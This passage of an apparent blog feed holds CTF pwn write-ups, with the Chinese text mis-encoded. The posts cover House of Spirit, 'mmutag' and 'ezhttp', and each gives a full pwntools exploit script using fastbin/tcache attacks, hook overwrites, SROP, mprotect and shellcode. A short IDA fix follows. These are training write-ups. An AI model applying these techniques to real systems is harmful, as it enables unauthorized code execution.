ˆçš„å†…å­˜æƒ…å†µ,<strong>æ­¤å‰idè¾“å…¥çš„æ˜¯65</strong>ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/Sy4TQJ.png" srcset="/img/loading.gif" alt><br>å‰0x40ä¸ºå¯æ§åŒºåŸŸï¼Œç®­å¤´æŒ‡çš„æ–¹å‘æ˜¯å¯ä»¥è¦†ç›–çš„å †æŒ‡é’ˆï¼Œidçš„ä¸Šæ–¹æœ‰ä¸€ä¸ªret addressï¼Œå…¶åœ¨è¾“å…¥3é€€å‡ºæ—¶å¯ä»¥è·³è½¬åˆ°ã€‚æ‰€ä»¥å…¶ä¸ºç›®æ ‡åœ°å€ï¼Œå…¶å‰é¢æœ‰å¯æ§çš„0x40çš„åŒºåŸŸï¼Œåé¢ä¹Ÿæœ‰ä¸€ä¸ªid 0x8çš„å¯æ§åŒºåŸŸï¼Œæ»¡è¶³æ¡ä»¶ å¼€å§‹æ„é€ ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/fO0l4K.png" srcset="/img/loading.gif" alt></p><p>è¿™æ ·freeä¸€ä¸‹å°±ä¼šæœ‰ä¸ªè¿›å…¥fastbin åœ¨æ ˆä¸Šçš„fakeå †ï¼Œç”³è¯·ä¸Šå»å³å¯ä¿®æ”¹åˆ°ç›®æ ‡åŒºåŸŸã€‚</p><ul><li>ä¿®æ”¹ret addreeä¸ºshellcodeçš„åœ°å€ã€‚å…¶å¯ä»¥åœ¨ç¬¬ä¸€æ¬¡è®©ä½ è¾“å…¥æ—¶ï¼Œæ”¾å…¥æ ˆä¸­ã€‚</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./pwn200&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26670)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;1&#39;)    sla(&#39;long&#39;,str(size))    sa(&#39;me&#39;,str(data))def free():    sla(&#39;choice&#39;,&#39;2&#39;)shellcode = asm(shellcraft.sh())sa(&#39;u&#39;,shellcode)ru(&#39;\x05&#39;)leak_stack = uu64(r(6))info_addr(&#39;leak_stack&#39;,leak_stack)shellcode_addr = leak_stack - 0x50# debug()sla(&#39;id&#39;,&#39;65&#39;)payload = p64(0)*5 + p64(0x41) + p64(0) + p64(leak_stack - 0x90)sa(&#39;money&#39;,payload)free()payload = p64(0)*3 + p64(shellcode_addr)add(0x38,payload)sleep(0.2)sla(&#39;choice&#39;,&#39;3&#39;)# debug()itr()</code></pre><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.anquanke.com/post/id/199468#h2-19" target="_blank" rel="noopener">https://www.anquanke.com/post/id/199468#h2-19</a><br><a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85357</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-Spirit&quot;&gt;&lt;a href=&quot;#House-of-Spirit&quot; class=&quot;headerlink&quot; title=&quot;House of Spirit&quot;&gt;&lt;/a&gt;House of Spirit&lt;/h1&gt;&lt;p&gt;House of Spiritï¼ˆä¸‹é¢
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="Houseç³»åˆ—" scheme="http://chumen77.xyz/tags/House%E7%B3%BB%E5%88%97/"/>
    
      <category term="heap" scheme="http://chumen77.xyz/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp</title>
    <link href="http://chumen77.xyz/2020/10/09/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/10/09/è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp/</id>
    <published>2020-10-09T00:23:05.599Z</published>
    <updated>2020-10-14T15:43:53.754Z</updated>
    
    <content type="html"><![CDATA[<h1 id="è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp"><a href="#è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp" class="headerlink" title="è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp"></a>è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp</h1><h2 id="mmutag"><a href="#mmutag" class="headerlink" title="mmutag"></a>mmutag</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>ç»™äº†ä¸€ä¸ªæ ˆåœ°å€</li><li>æ²¡æœ‰showå‡½æ•°</li><li>free å‡½æ•°å­˜åœ¨uaf</li><li>addå‡½æ•°åªèƒ½ç”³è¯·å †å·ä¸º1-10çš„å †å—ï¼Œå¤§å°ä»…ä¸º0x68</li><li>å¯ä»¥ç»™æ ˆä¸Šè¯»ä¸€æ®µæ•°æ®</li></ul><pre><code class="c">char buf; // [rsp+10h] [rbp-20h]</code></pre><pre><code class="c">  if ( v3 != 3 )        break;      read(0, &amp;buf, 0x20uLL);      printf(&quot;Your content: %s\n&quot;, &amp;buf);</code></pre><p>åˆ©ç”¨è¿™ä¸ªå¯ä»¥æ³„æ¼æ ˆä¸Šçš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥åœ¨æ ˆä¸Šå†™ä¸€å®šçš„æ•°æ®ã€‚</p><h3 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h3><p>å¦‚ä½•æ³„æ¼libcåœ°å€ã€‚</p><p>æ ˆä¸Šæ˜¯æœ‰å¾ˆå¤šæ•°æ®çš„ï¼Œå¯ä»¥ç”¨choice 3è¿›è¡Œæ³„æ¼ä¸€å®šçš„æ•°æ®ï¼Œä½†æ˜¯ç”±äº<code>\x00</code>çš„æˆªæ–­ï¼Œæ³„æ¼ä¸€ä¸ªstackåœ°å€åï¼Œå…¶åæœ‰ç”¨çš„libcåœ°å€æ²¡åŠæ³•æ³„æ¼ã€‚</p><p>çœ‹ä¸‹å…¶æ ˆæƒ…å†µï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/IqyiLw.png" srcset="/img/loading.gif" alt><br>å¯æ§åŒºåŸŸ0x20ï¼Œå¦‚æœå¯ä»¥å¡«å……å…¶ä¸­æ— ç”¨çš„æ•°æ®åˆ°libcåœ°å€ï¼Œå†åˆ©ç”¨ä¸€æ¬¡ choice 3 å³å¯å®Œæˆæ³„æ¼ã€‚</p><p>ç°åœ¨ä¹Ÿå·²ç»çŸ¥é“äº†stackçš„åœ°å€ã€‚ä¼ªé€ ä¸€ä¸ª0x70çš„å †ï¼Œç„¶åfastbin attackå³å¯ç”³è¯·åˆ°è¿™æ ˆä¸Šçš„å†…å­˜ã€‚ç„¶åå¡«å……ï¼Œè·å–libcåœ°å€ã€‚æ¥ç€æ”»å‡»malloc hookå³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./mmutag&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;183.129.189.61&#39;,55704)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def input_introduce(data):    sla(&#39;your introduce&#39;,str(data))def add(idx,data):    sla(&#39;ise&#39;,&#39;1&#39;)    sla(&#39;id&#39;,str(idx))    sa(&#39;tent&#39;,str(data))def free(idx):    sla(&#39;ise&#39;,&#39;2&#39;)    sla(&#39;id&#39;,str(idx))data = &#39;1&#39; * 0x60sa(&#39;name&#39;,data)ru(&#39;0x&#39;)leak_libc = int(r(12),16)sla(&#39;ice&#39;,&#39;2&#39;)add(1,&#39;chumen77&#39;)add(2,&#39;chumen77&#39;)free(1)free(2)free(1)sla(&#39;ise&#39;,&#39;3&#39;)payload = p64(0) + p64(0x70) + p64(0)s(payload)add(4,p64(leak_stack - 0x40))add(5,&#39;1&#39;)add(6,&#39;1&#39;)add(7,&#39;1&#39; * 0x47 + &#39;2&#39;)sla(&#39;ise&#39;,&#39;3&#39;)s(&#39;1&#39; * 0x20)info_addr(&#39;leak-stack&#39;,leak_stack)ru(&#39;2&#39;)libc_base = uu64(r(6)) - 0x20840info_addr(&#39;libc_base&#39;,libc_base)free(1)free(2)free(1)malloc_hook  = 0x3c4aed + libc_baseadd(3,p64(malloc_hook))add(8,&#39;1&#39;)add(9,&#39;1&#39;)one = 0xf0364 + libc_basepayload = (3 + 0x10) * &#39;\x00&#39; + p64(one)add(10,payload)free(3)free(3)# debug()itr()</code></pre><p>æœ€åå› ä¸ºæ²¡æœ‰å †å¯ä»¥ç”³è¯·ï¼Œå¯ä»¥æ•…æ„è§¦å‘æŠ¥é”™ï¼Œå…¶ä¼šè°ƒç”¨åˆ°mallocæ¥å‚¨å­˜éƒ¨åˆ†æ•°æ®ï¼Œæ­¤æ—¶ä¹Ÿå°±å¯ä»¥get shellã€‚</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>çœ‹èµ·æ¥è¾ƒä¸ºå¤æ‚ï¼Œå› ä¸ºå®ç°äº†ä¸€ä¸ªå¯¹Http packetçš„äº¤äº’ï¼Œè®©æˆ‘è¿™ç§ä¸æ˜¯å¾ˆç†Ÿæ‚‰http packetï¼Œcodingèƒ½åŠ›å·®çš„äººï¼Œé€†å‘èµ·æ¥æœ‰ç‚¹åƒåŠ›ã€‚</p><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="å‰ç½®æŠ€èƒ½"><a href="#å‰ç½®æŠ€èƒ½" class="headerlink" title="å‰ç½®æŠ€èƒ½"></a>å‰ç½®æŠ€èƒ½</h4><ul><li>ç®€æ˜“çš„Http packetç»“æ„</li><li><code>setcontext</code> å‡½æ•°çš„exploit</li><li>å„ç§ä¸ç†Ÿæ‚‰çš„å­—ç¬¦ä¸²å¤„ç†å‡½æ•°<code>sscanf strchr strtok</code> </li></ul><h4 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h4><ul><li>å¼€å¤´åˆå§‹åŒ–ï¼Œå¼€å¯äº†æ²™ç®±ï¼Œåªèƒ½orwæ¥è·å–flag</li><li>addå‡½æ•°ï¼Œä»¥è¾“å…¥çš„å­—ç¬¦æ•°é‡æ¥ç»™ä½ åˆ†é…å †ï¼Œæ‰€ä»¥<code>\x00</code>ç”¨ä¸äº†äº†ï¼Œæœ€å¤§0x100ï¼Œä¸”ç»™äº†heapçš„åœ°å€</li><li>del å‡½æ•°ï¼Œå­˜åœ¨uaf</li><li>æ— showå‡½æ•°</li><li>editå‡½æ•°ï¼Œå¯ä»¥è¾“å…¥<code>\x00</code>çš„å­—ç¬¦ï¼Œæ— vul</li></ul><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>free 0x100çš„chunk 8æ¬¡ï¼Œä½¿å…¶è¿›å…¥unsortbinï¼Œç•™ç€æ”»å‡»stdout</li><li>tcache attack æ”»å‡»åˆ°<code>_IO_2_1_stdout_</code> ï¼Œä½¿å…¶æ³„æ¼libcåœ°å€</li><li>tcache attack æ”»å‡»free hookï¼Œå†™ä¸Šsetcontext + 53 ï¼Œå‡†å¤‡sropè¿›è¡Œæ”»å‡»</li><li>sropè¯»å…¥mprotectçš„rop chainï¼Œå¼€å¯heapæ®µçš„æ‰§è¡Œæƒé™</li><li>edit ä¸€ä¸ªheapçš„å†…å­˜ä¸º orw flag</li><li>è§¦å‘free hookï¼Œorw get flag</li></ul><h3 id="ç»†èŠ‚é›†åˆ"><a href="#ç»†èŠ‚é›†åˆ" class="headerlink" title="ç»†èŠ‚é›†åˆ"></a>ç»†èŠ‚é›†åˆ</h3><h4 id="å¯¹äºstdoutçš„æ”»å‡»"><a href="#å¯¹äºstdoutçš„æ”»å‡»" class="headerlink" title="å¯¹äºstdoutçš„æ”»å‡»"></a>å¯¹äºstdoutçš„æ”»å‡»</h4><p>å…¶ä¸­ï¼Œåœ¨åˆ©ç”¨libcæ®‹ç•™ä¼ªé€ stdoutåœ°å€ä½œä¸ºfdçš„æ—¶å€™ï¼Œåªè¦æ”¹3å­—èŠ‚ï¼Œå…¶è‚¯å®šæ˜¯ç”³è¯·çš„0x20çš„å †ï¼Œä½†æ˜¯ä¸Šstdoutç»“æ„ä½“æ—¶éœ€è¦0x21å­—èŠ‚çš„å†™å…¥ã€‚<br>tcacheåˆ†é…ä¸­ï¼Œå¹¶ä¸éªŒè¯å †çš„å¤§å°ï¼Œåªè¦fdæŒ‡å¥½å°±OKäº†ï¼Œæ‰€ä»¥ç”³è¯·ä¸ªè‡³å°‘å¯ä»¥å†™å…¥0x21å­—èŠ‚çš„å †å³å¯ã€‚ä½†æ˜¯ç”±äºç¨‹åºåˆ†é…chunkçš„ç­–ç•¥ï¼Œç”³è¯·æ—¶è‚¯å®šè¦å†™æ•°æ®ï¼Œå†™ä»€ä¹ˆä¸ä¼šcrushã€‚ä¸ªäººåšçš„æ—¶å€™,ä¹±å¡«å……æ•°æ®ï¼Œcrushäº†å¾ˆå¤šæ¬¡ï¼Œå¤´éƒ½ç‚¸äº†ã€‚å¯ä»¥çœ‹ä¸€ä¸‹<code>_IO_2_1_stdout_</code>ç»“æ„ä½“ï¼š</p><pre><code>pwndbg&gt; ptype stdouttype = struct _IO_FILE {    int _flags;    char *_IO_read_ptr;    char *_IO_read_end;    char *_IO_read_base;    char *_IO_write_base;      char *_IO_write_ptr;       char *_IO_write_end;    char *_IO_buf_base;    char *_IO_buf_end;    char *_IO_save_base;    char *_IO_backup_base;    char *_IO_save_end;    struct _IO_marker *_markers;    struct _IO_FILE *_chain;    int _fileno;    int _flags2;    __off_t _old_offset;    unsigned short _cur_column;    signed char _vtable_offset;    char _shortbuf[1];    _IO_lock_t *_lock;    __off64_t _offset;    struct _IO_codecvt *_codecvt;    struct _IO_wide_data *_wide_data;    struct _IO_FILE *_freeres_list;    void *_freeres_buf;    size_t __pad5;    int _mode;    char _unused2[20];} *</code></pre><p>åœ¨å­¦ä¹ io fileç›¸å…³çŸ¥è¯†æ—¶ï¼Œå¯ä»¥äº†è§£åˆ°å¯¹äºè·å–å’Œè¾“å‡ºä¿¡æ¯ï¼Œå¾ˆé‡è¦çš„å°±æ˜¯å¼€å¤´<code>_flags</code> ï¼Œå…¶å†³å®šäº†æ­¤æ—¶ioçš„çŠ¶å†µã€‚</p><p>å…¶ä¸­æ³¨æ„åˆ°<code>_flags</code> å¤§å°æ˜¯intå‹ï¼Œæ‰€ä»¥åœ¨libcåœ°å€å…¶è¯»å–å’ŒéªŒè¯å°†è¦åšä»€ä¹ˆæ—¶ï¼Œæ˜¯ä»¥intçš„å®½åº¦æ¥è·å–çš„ã€‚æ‰€ä»¥è®¾ç½®å¯¹ä½ä½8å­—èŠ‚å³å¯ã€‚æ¯”å¦‚<code>0xfffffffffbad3c80</code> <code>0x12345678fbad3c80</code> ,å‰©ä¸‹çš„å°±å¥½è¯´äº†ï¼Œå…¨å¼„æˆ<code>a</code>çš„åƒåœ¾å­—ç¬¦å †ã€‚</p><p>ç„¶åå†æ¬¡editï¼Œè¿™ä¸ª<code>_IO_2_1_stdout_</code>å³å¯æ³„æ¼å‡ºlibcåœ°å€ã€‚</p><h4 id="æ”¹free-hookå†™setcontextæ—¶çš„ç»†èŠ‚"><a href="#æ”¹free-hookå†™setcontextæ—¶çš„ç»†èŠ‚" class="headerlink" title="æ”¹free hookå†™setcontextæ—¶çš„ç»†èŠ‚"></a>æ”¹free hookå†™setcontextæ—¶çš„ç»†èŠ‚</h4><p>å…¶ä¸­éœ€è¦æ³¨æ„ä¸€ä¸‹libcç‰ˆæœ¬ï¼Œåœ¨æœ€ä½çš„libc 2.27ç‰ˆæœ¬ä¸­ï¼Œå…¶ç»å¸¸æ˜¯ä»¥<code>0xXXXXXXX00a0</code>è¿™æ ·çš„å­˜åœ¨ã€‚ç›´æ¥æ”¹å†™æ—¶ï¼Œ<code>/x00</code>è¢«æˆªæ–­ï¼Œå†™ä¸ä¸Šfree hookã€‚ç„¶åæƒ³ç€ç”¨edit è¿›è¡Œä¿®æ”¹ã€‚ä½†æ˜¯ä¼šå‘ç°ï¼Œæ­¤æ—¶åçš„free hookæƒ…å†µä¸‹ï¼Œç”¨editç›´æ¥crushã€‚</p><p>è€ƒè™‘å‡çº§ä¸€ä¸‹libcç‰ˆæœ¬å·å¯¹åº”å¯¹èµ›é¢˜æœåŠ¡å™¨çš„libcç‰ˆæœ¬ï¼Œä½†æ˜¯libc2.27æœ€è¿‘æ›´æ–°äº†ï¼Œç›´æ¥<code>apt upgrade libc6</code> å°±ä¼šå‡çº§åˆ°libc 2.27:1.3æœ€æ–°ç‰ˆæœ¬ï¼Œå…¶å¢åŠ äº†å¯¹double freeçš„æ£€æµ‹ï¼Œå°±ç›´æ¥åšä¸äº†äº†ã€‚</p><p>apt æŒ‡å®šç‰ˆæœ¬çš„å‡çº§ï¼š</p><pre><code>apt-cache madison libc6                  apt-get install libc6=2.27-3ubuntu1.2 apt-cache madison libc6-dbgapt-get install libc6-dbg=2.27-3ubuntu1.2</code></pre><p>è¿™æ ·å°±å‡çº§å¥½äº†ï¼Œå¹¶ä¸”è§£å†³äº†ä¸ªäººå†™setcontextçš„é—®é¢˜ï¼Œå› ä¸ºå…¶åœ°å€æ²¡æœ‰å†æœ‰``x00```ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./ezhttp&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;172.17.0.2&#39;,23946)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()# debug()def add(data):    content = &#39;POST\n&#39;    content += &#39;/create \nCookie: user=admin token: \r\n\r\n&#39;    content += &#39;content=&#39;+str(data)    ru(&#39;Send Http packet to me:&#39;)    s(str(content))    sleep(0.05)def free(index):    content = &#39;POST\n&#39;    content += &#39;/del \nCookie: user=admin token: \r\n\r\n&#39;    content += &#39;index=&#39;+str(index)    ru(&#39;Send Http packet to me:&#39;)    s(str(content))def edit(idx,data):    content = &#39;POST\n&#39;    content += &#39;/edit \nCookie: user=admin token: \r\n\r\n&#39;    content += &#39;index=&#39;+ str(idx) + &#39;&amp;content=&#39;+str(data)+ &#39;\n&#39;    s(str(content))    sleep(0.05)def leak_addr():    payload = &#39;1&#39; *0x100    add(payload)     ru(&#39;0x&#39;)    heap_base = int(r(12),16) - 0x10    info_addr(&#39;heap_base&#39;,heap_base)    add(payload)     add(&#39;1&#39;*0x8)     add(&#39;1&#39;*0xf8)    for i in range(7):        free(0)    free(0)    add(&#39;\x60\xa7&#39;)     add(&#39;1&#39;*0x18)     add(&#39;1&#39;*0x20)     free(6)    free(6)    add(&#39;1&#39;*0x20)     payload = p64(heap_base + 0x10)    edit(7,payload)    add(&#39;1&#39;*0x20)     # debug()    add(&#39;1&#39;*0x20)     sleep(0.1)    payload = p64(0x12345678fbad3c80) + &#39;\x01&#39; *0x20    add(payload) #8    payload = p64(0xfbad3c80) + p64(0) * 3 + &#39;\x00&#39;    edit(10,payload)    add(&#39;1&#39;*0x90)    return heap_baseleak = 0while True:    try:        heap_base = leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(16)        leak = u64(io.recv(8))        if leak == 0x320a6464412e310a:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        io = process(&#39;./ezhttp&#39;)        continueleak = leak &gt;&gt; 16info_addr(&#39;leak&#39;,leak)libc_base = leak - 0x3eb780info_addr(&#39;libc_base&#39;,libc_base)free_hook = 0x3ed8e8 + libc_baseset_context = libc.sym[&#39;setcontext&#39;] + 53 + libc_baseinfo_addr(&#39;heap_base&#39;,heap_base)info_addr(&#39;context&#39;,set_context)orw = shellcraft.open(&#39;./flag&#39;)orw +=shellcraft.read(&#39;rax&#39;,heap_base+0x300,0x30)orw +=shellcraft.write(1,heap_base+0x300,0x30)edit(11,asm(orw))# debug()frame = SigreturnFrame()frame.rdi = 0frame.rsi = free_hookframe.rdx = 0x300frame.rsp = free_hookframe.rip = libc_base + libc.search(asm(&quot;syscall \nret&quot;)).next()edit(1,str(frame))free(2)free(2)free(2)# debug()add(p64(free_hook))add(&#39;1&#39;*6)info_addr(&#39;context&#39;,set_context)add(p64(set_context))# debug()free(1)pop_rdi = 0x000000000002155f+libc_basepop_rsi = 0x0000000000023e8a+libc_basepop_rdx = libc_base+0x0000000000001b96pop_rax = libc_base+0x0000000000043a78payload = flat([pop_rdi,heap_base-0x250,pop_rsi,0x1000,pop_rdx,7,libc_base+libc.sym[&#39;mprotect&#39;],heap_base+0x80])s(payload)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp&quot;&gt;&lt;a href=&quot;#è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp&quot; class=&quot;headerlink&quot; title=&quot;è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp&quot;&gt;&lt;/a&gt;è¥¿æ¹–è®ºå‰‘éƒ¨åˆ†wp&lt;/h1&gt;&lt;h2 id=&quot;mmutag&quot;&gt;&lt;a href=&quot;#mmutag&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>mac ä¸Šida 7.0 é—ªé€€ æ‰“ä¸å¼€ è§£å†³åŠæ³•</title>
    <link href="http://chumen77.xyz/2020/10/06/mac%20%E4%B8%8Aida%207.0%20%E9%97%AA%E9%80%80%20%E6%89%93%E4%B8%8D%E5%BC%80%20%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <id>http://chumen77.xyz/2020/10/06/mac ä¸Šida 7.0 é—ªé€€ æ‰“ä¸å¼€ è§£å†³åŠæ³•/</id>
    <published>2020-10-06T14:37:29.022Z</published>
    <updated>2020-10-09T00:22:47.125Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mac-ä¸Šida-7-0-é—ªé€€-æ‰“ä¸å¼€-è§£å†³åŠæ³•"><a href="#mac-ä¸Šida-7-0-é—ªé€€-æ‰“ä¸å¼€-è§£å†³åŠæ³•" class="headerlink" title="mac ä¸Šida 7.0 é—ªé€€ æ‰“ä¸å¼€ è§£å†³åŠæ³•"></a>mac ä¸Šida 7.0 é—ªé€€ æ‰“ä¸å¼€ è§£å†³åŠæ³•</h1><h2 id="æƒ…æ™¯1"><a href="#æƒ…æ™¯1" class="headerlink" title="æƒ…æ™¯1"></a>æƒ…æ™¯1</h2><p>ä¸‹è½½ä»¥åç›´æ¥ä¸èƒ½ç”¨çš„ã€‚</p><p><a href="https://github.com/fjh658/IDA7.0_SP" target="_blank" rel="noopener">https://github.com/fjh658/IDA7.0_SP</a></p><p><a href="https://github.com/swfangzhang/IDA-pro-7-for-Catalina-OSX-15" target="_blank" rel="noopener">https://github.com/swfangzhang/IDA-pro-7-for-Catalina-OSX-15</a></p><p>å‚è€ƒè¿™ä¸ªä¸¤ä¸ªgithubçš„é¡¹ç›®å³å¯ã€‚</p><h2 id="æƒ…æ™¯2"><a href="#æƒ…æ™¯2" class="headerlink" title="æƒ…æ™¯2"></a>æƒ…æ™¯2</h2><p>å¹³æ—¶æ­£å¸¸ä½¿ç”¨ï¼Œçªç„¶å› ä¸ºè£…äº†å†²çªçš„æ’ä»¶æ‰“ä¸å¼€idaï¼Œç›´æ¥crashã€‚æˆ–è€…è«åç‚¹å‡»idaå›¾æ ‡å°±æ²¡æœ‰ä»»ä½•ååº”ã€‚è¿›å…¥ida.app bin ä¸‹çš„idaï¼ŒåŒå‡»æ‰§è¡Œå‘½ä»¤è¡Œä¸­ï¼Œä¼šæ˜¾ç¤ºå†…æ ¸é”™è¯¯çš„æƒ…å†µã€‚</p><pre><code class="python"> ~ cd .idapro  ~/.idapro  rm -rf ida.reg</code></pre><p>è¿™æ ·å°±å¯ä»¥è§£å†³äº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;mac-ä¸Šida-7-0-é—ªé€€-æ‰“ä¸å¼€-è§£å†³åŠæ³•&quot;&gt;&lt;a href=&quot;#mac-ä¸Šida-7-0-é—ªé€€-æ‰“ä¸å¼€-è§£å†³åŠæ³•&quot; class=&quot;headerlink&quot; title=&quot;mac ä¸Šida 7.0 é—ªé€€ æ‰“ä¸å¼€ è§£å†³åŠæ³•&quot;&gt;&lt;/a&gt;mac ä¸Šida 7.0 é—ª
      
    
    </summary>
    
    
      <category term="æ‚é¡¹" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF åˆ·é¢˜è®°å½•</title>
    <link href="http://chumen77.xyz/2020/09/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/09/28/BUUCTFåˆ·é¢˜è®°å½•/</id>
    <published>2020-09-28T11:24:58.046Z</published>
    <updated>2020-10-20T13:10:52.647Z</updated>
    
